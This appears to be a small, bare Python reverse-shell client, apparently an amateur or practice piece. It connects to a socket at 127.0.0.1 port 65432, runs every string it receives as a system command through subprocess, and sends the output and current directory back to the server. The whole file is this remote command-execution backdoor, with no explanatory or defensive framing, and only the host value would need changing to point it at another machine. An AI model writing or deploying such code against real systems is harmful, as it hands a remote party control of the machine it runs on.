import socket
import os
import subprocess
HOST = "127.0.0.1"
PORT = 65432 

clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
clientSocket.connect((HOST,PORT))
while True:
        data = clientSocket.recv(1024)
        data = data.decode()
        print("hi")
        if data:
            result = subprocess.run(data, capture_output=True, text=True)
            output = result.stdout.strip()
            cwd = os.getcwd()
            datatosend = cwd + " >" + output
            clientSocket.sendall(datatosend.encode())